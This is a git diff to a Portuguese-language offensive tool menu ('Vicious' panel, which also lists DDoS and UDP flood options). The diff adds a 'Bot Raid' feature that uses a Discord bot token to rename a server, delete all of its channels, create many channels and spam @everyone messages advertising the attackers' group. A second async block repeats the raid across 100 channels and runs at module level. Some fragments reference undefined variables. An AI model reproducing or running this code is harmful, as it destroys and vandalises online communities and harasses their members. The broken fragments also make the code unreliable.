@@ -49,20 +49,20 @@ def intro():
 ''')
     time.sleep(3)
     
+
 # ---------------- ASCII ART -------------------
 def ascii_art():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.RED + Style.BRIGHT + r"""
-
 ██╗   ██╗██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗    ██████╗  █████╗ ██╗███╗   ██╗███████╗██╗     
 ██║   ██║██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝    ██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██║     
 ██║   ██║██║██║     ██║██║   ██║██║   ██║███████╗    ██████╔╝███████║██║██╔██╗ ██║█████╗  ██║     
 ╚██╗ ██╔╝██║██║     ██║██║   ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║██║╚██╗██║██╔══╝  ██║     
  ╚████╔╝ ██║╚██████╗██║╚██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║██║ ╚████║███████╗███████╗
   ╚═══╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
-                                                                                                  
 
-    """)
+
+""")
     print(Fore.RED + Style.BRIGHT + "="*60)
     print(Fore.WHITE + Style.BRIGHT + " " * 15 + "PAINEL DE OPERAÇÕES - VICIOUS")
     print(Fore.RED + Style.BRIGHT + "="*60)
@@ -96,6 +96,7 @@ def menu():
     print(Fore.LIGHTRED_EX + "[23] Flood UDP")
     print(Fore.LIGHTRED_EX + "[24] Payload para Exploit")
     print(Fore.LIGHTRED_EX + "[25] Backup de Arquivos Remotos")
+    print(Fore.LIGHTRED_EX + "[26] Bot Raid")
     print(Fore.LIGHTRED_EX + "[0] Sair")
     print()
 
@@ -1127,6 +1128,197 @@ def backup_remoto():
     input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
     menu()
 
+# ---------------------- Bot Raid -------------------
+import discord
+import asyncio
+import random
+import os
+import time
+
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+# ========== FUNÇÕES DE INTERFACE ==========
+
+def print_lento(texto, atraso=0.01):
+    for char in texto:
+        print(char, end='', flush=True)
+        time.sleep(atraso)
+    print()
+
+def limpar_tela():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def bot_raid():
+    ascii_art()
+    print(Fore.LIGHTRED_EX + "\n💥 BOT RAID 💥\n")
+    
+    token = input(Fore.WHITE + "Digite o token do bot: " + Fore.LIGHTRED_EX)
+    guild_id = input(Fore.WHITE + "Digite o ID do servidor: " + Fore.LIGHTRED_EX)
+    num_channels = int(input(Fore.WHITE + "Digite a quantidade de canais a serem criados: " + Fore.LIGHTRED_EX))
+    
+    server_name = "☠️ DOMINADO PELA VICIOUS TEAM ☠️"
+    discord_invite = "https://discord.gg/7jgYqTaNyV"
+    
+    channel_names = [
+        "v̸̢͎̘͉̿͋̌i̵͕̿c̷͚̥̈́ì̶̯̤̲o̴͈͂̈́ṵ̵̡̨̖̇͝s̶͙̈́", "v̶̗̒͝1c10us", "V̴̺̎̋͜1̴͙̋C̵͎̊1̴͙̋0̵͎̊Ű̴͙S̵͎̊", "v̷i̷c̷i̷o̷u̷s̷-x", "v1c1øus-3mp1r3",
+        "ⓥⓘⓒⓘⓞⓤⓢ", "v̶̺̼̪̈́͜ī̶̢̯c̸͎̣̈́̔̈́ȉ̷̲̲̐o̵͇͛̈́̉ũ̶̝̜̥s̶̺̐͠", "vιcισυѕ-∂єαтн", "v̵̡̛̠̲̭͙̦̞̝̲̘̪̩̙͇̓̅̈́̅͐̈́̍̈́̎̾̀͛͝į̸̮̭̦̰̓̄̎̊͒̽̍̆̈́̏̋͑̕͝c̴̡̹̩̹̩̬̳̺̪͚̱̒̔̋̾̈́̍̐̈́̅̈́̃̚į̵̝͕̥̘̖̘̩̤̝̯͓̻͗͆̌̽̈̍̊̈́̓͑͝ờ̴̡̧̧̠̻̹̣̰̪͔̮̗̬̊̒̒̅̀̇̃͆̉͆͛͘ų̸̟̙̼̯̭̩̺̖͔̇̉̊̌̅̅̊͋̽̑̅̍̈́̌͝s̵̢̭̩̑̑̀̐̌̿̃̍̂̌̽̂̂", "v1c10us-h4ck",
+        "🆅🅸🅲🅸🅾🆄🆂", "v̴̧̢̖̞̬̱̮̥̠͔̜̫̈́̅̈́͛̓̋̈́̄͘͝͝į̴̛̥͕̺̜̺̜̘̺̣̿̓̂̊̆͌̂͌̆̅̚͜͝͝c̸̢̧̩͖̩̻̦̩̦̥͍̭̹̓͐̄͗̅̕̚ͅi̴̡̳̬̖̝̤̜̱̖̥̾̿̈́̊͆̂̊̽̏͆̆̃̔͘͜͝o̴̡̡̢̢̝̯͚̙͚̜̜͚͆̉̔̆̅̾̍̍̈́̿̿̚͜͜͠͝ͅͅů̸̧̨̨̧̘̭͚̲̗̩̩̝̋̆̒̈́̈́̊͝s̷̛̛̫̦̜̦̲̔̈́̓̈́̿̄̎̑̈́̕͝", "v̸̛̤̩̫͖̦̈́̐͘͜i̷̧̢̯̙̎͒̏c̶̨̨̝̦̖̑̋̍̌̈́i̴̘͎̊̿̎̈̕ọ̵̦̤͝u̶̘̪̠̦͛͘s̴̹̣̃̃-ẗ̸̝̬́̑̽̾e̵͓̫̜̽̂̄a̶͉̗̺͗͌̿̕m̸̧̼̺͖̆̿̕", "v̸̢̜̮̈́̈́̅ḯ̵̭͙̕c̴̨̭̊i̵̧̮̒͠ǫ̷̱͊̂u̶̙̽̈́s̶̠̈́̈-ḱ̵̠̱̈́͘ͅḯ̶̺̟̞̎̔ṋ̸̫̖̒̃g̴̥̝̽̚", "v1c10us-3l1t3"
+    ]
+    
+    min_messages = int(input(Fore.WHITE + "Digite o número mínimo de mensagens por canal: " + Fore.LIGHTRED_EX))
+    max_messages = int(input(Fore.WHITE + "Digite o número máximo de mensagens por canal: " + Fore.LIGHTRED_EX))
+    
+    embed_messages = [
+        {"title": "💀 VICIOUS TEAM DOMINOU", "description": f"Entre no servidor oficial da Vicious:\n{discord_invite}", "color": 0xFF0000},
+        {"title": "⚠️ SERVIDOR DOMINADO", "description": f"Vicious  passou por aqui\nJunte-se a nós: {discord_invite}", "color": 0xFF4500},
+        {"title": "☣️ VICIOUS TEAM REINA", "description": f"Faça parte do melhor grupo hacker\n{discord_invite}", "color": 0x800080},
+        {"title": "⚡ VICIOUS DOMINOU TUDO", "description": f"Entre para a Vicious:\n{discord_invite}", "color": 0x8B0000},
+        {"title": "🔥 VICIOUS É PODER", "description": f"Servidor oficial da Vicious:\n{discord_invite}", "color": 0xFF8C00}
+    ]
+    
+    try:
+        headers = {
+            'Authorization': f'Bot {token}',
+            'Content-Type': 'application/json',
+            'User-Agent': 'DiscordBot (https://discord.com) Python/3.8'
+        }
+        
+        # First change the server name
+        guild_name_url = f'https://discord.com/api/v9/guilds/{guild_id}'
+        guild_name_data = {'name': server_name}
+        requests.patch(guild_name_url, headers=headers, json=guild_name_data)
+        
+        # Primeiro deleta todos os canais existentes
+        channels_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
+        response = requests.get(channels_url, headers=headers)
+        channels = response.json()
+        
+        if isinstance(channels, list):
+            for channel in channels:
+                if isinstance(channel, dict) and 'id' in channel and 'name' in channel:
+                    delete_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
+                    requests.delete(delete_url, headers=headers)
+                    print(Fore.GREEN + f"Canal {channel['name']} deletado!")
+            
+            # Cria novos canais e envia mensagens
+            for i in range(num_channels):
+                random_name = f"{random.choice(channel_names)}-{random.randint(100,999)}"
+                channel_data = {
+                    'name': random_name,
+                    'type': 0  # 0 = canal de texto
+                }
+                
+                response = requests.post(channels_url, headers=headers, json=channel_data)
+                if response.status_code == 201:
+                    new_channel = response.json()
+                    print(Fore.LIGHTGREEN_EX + f"Canal {new_channel['name']} criado!")
+                    
+                    # Envia mensagens aleatórias com embed no novo canal
+                    message_url = f'https://discord.com/api/v9/channels/{new_channel["id"]}/messages'
+                    num_messages = random.randint(min_messages, max_messages)
+                    
+                    for _ in range(num_messages):
+                        embed = random.choice(embed_messages)
+                        message_data = {
+                            'content': '@everyone',
+                            'embeds': [
+                                {
+                                    'title': embed['title'],
+                                    'description': embed['description'],
+                                    'color': embed['color'],
+                                    'footer': {'text': '🔥 Vicious passou por aqui 🔥'}
+                                }
+                            ]
+                        }
+                        requests.post(message_url, headers=headers, json=message_data)
+                        print(Fore.CYAN + f"Mensagem enviada no canal {new_channel['name']}!")
+                else:
+                    print(Fore.RED + f"Erro ao criar canal: {response.status_code}")
+            
+            print(Fore.LIGHTGREEN_EX + "\n✅ Raid concluído com sucesso!")
+        else:
+            print(Fore.RED + "Erro: Falha na autenticação. Verifique se o token do bot está correto e se ele tem as permissões necessárias.")
+            
+    except Exception as e:
+        print(Fore.LIGHTRED_EX + f"\n❌ Erro durante o raid: {str(e)}")
+    
+    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
+
+# ========== CONFIGURAÇÕES ==========
+GLITCHED_NAME = "💀 HACKED BY VICIOUS 💀"
+CHANNEL_NAMES = ["vicious", "hacked-by-vicious", "invaded", "owned-by-vicious", "vx-danger", "redoverride", "error-vx"]
+SPAM_MESSAGES = [
+    "@everyone Vicious passou por aqui.",
+    "@everyone hacked by Vicious.",
+    "@everyone O controle agora é nosso.",
+    "@everyone Isso é apenas o começo.",
+    "@everyone Seus dados estão comprometidos.",
+    "@everyone Nós vemos tudo.",
+    "@everyone Este servidor foi dominado por Vicious."
+]
+GIF_URL = "https://media.tenor.com/g07C3F0akFwAAAAC/hacker-anonymous.gif"
+EMBED_COLOR = 0xFF0000
+
+# ========== BOT ==========
+@client.event
+async def on_ready():
+    print(f"✅ Bot conectado como: {client.user}")
+
+    guild = discord.utils.get(client.guilds, id=GUILD_ID)
+
+    if guild is None:
+        print("❌ O bot não está no servidor ou o ID é inválido.")
+        await client.close()
+        return
+
+    try:
+        await guild.edit(name=GLITCHED_NAME)
+    except Exception as e:
+        print(f"⚠️ Erro ao renomear servidor: {e}")
+
+    print("🧨 Deletando canais existentes...")
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks)
+
+    await asyncio.sleep(1)
+
+    print("💥 Criando canais e enviando mensagens...")
+
+    async def criar_canal(index):
+        nome = f"{random.choice(CHANNEL_NAMES)}-{random.randint(100,999)}"
+        canal = await guild.create_text_channel(nome)
+
+        for _ in range(3):
+            msg = random.choice(SPAM_MESSAGES)
+            embed = discord.Embed(
+                title="🔴 HACKED BY VICIOUS",
+                description="```SISTEMA COMPROMETIDO```",
+                color=EMBED_COLOR
+            )
+            embed.set_image(url=GIF_URL)
+            embed.set_footer(text="🩸 VICIOUS passou por aqui.")
+            await canal.send(content="@everyone " + msg, embed=embed)
+
+    tarefas = [criar_canal(i) for i in range(100)]
+    await asyncio.gather(*tarefas)
+
+    print("✅ Concluído com sucesso.")
+    await client.close()
+
+@client.event
+async def on_error(event, *args, **kwargs):
+    print("❌ Erro inesperado durante a execução.")
+
+try:
+    client.run(TOKEN)
+except discord.LoginFailure:
+    print("❌ Token inválido. Verifique e tente novamente.")
+    time.sleep(3)
+    os.execlp("python", "python", __file__)  # Reinicia o script
+except Exception as e:
+    print(f"❌ Erro inesperado: {e}")
+
 # Função para o menu
 def handle_ctrl_c(func):
     def wrapper(*args, **kwargs):
@@ -1164,12 +1356,12 @@ ataque_ddos = handle_ctrl_c(ataque_ddos)
 flood_udp = handle_ctrl_c(flood_udp)
 generate_payload = handle_ctrl_c(generate_payload)
 backup_remoto = handle_ctrl_c(backup_remoto)
+bot_raid = handle_ctrl_c(bot_raid)
 
 def menu():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print(Fore.RED + Style.BRIGHT + r"""
-
 ██╗   ██╗██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗    ██████╗  █████╗ ██╗███╗   ██╗███████╗██╗     
 ██║   ██║██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝    ██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██║     
 ██║   ██║██║██║     ██║██║   ██║██║   ██║███████╗    ██████╔╝███████║██║██╔██╗ ██║█████╗  ██║     
@@ -1209,6 +1401,7 @@ def menu():
 [23] Flood UDP
 [24] Payload para Exploit
 [25] Backup de Arquivos Remotos
+[26] Bot Raid
 [0] Sair
 ''')
         choice = input(Fore.WHITE + "[+] Escolha uma opção: ")
@@ -1260,9 +1453,11 @@ def menu():
         elif choice == '23':
             flood_udp()
         elif choice == '24':
-            payload_for_exploit()
+            generate_payload()
         elif choice == '25':
             backup_remoto()
+        elif choice == '26':
+            bot_raid()
         elif choice == '0':
             print(Fore.GREEN + "[+] Saindo...")
             break
@@ -1275,3 +1470,8 @@ def menu():
 
 # Chama a função principal do menu
 menu()
+try:
+    # Some code that may raise an exception
+    ...
+except Exception as e:
+    print(Fore.LIGHTRED_EX + f"Erro ao verificar {url_to_check}: {e}")
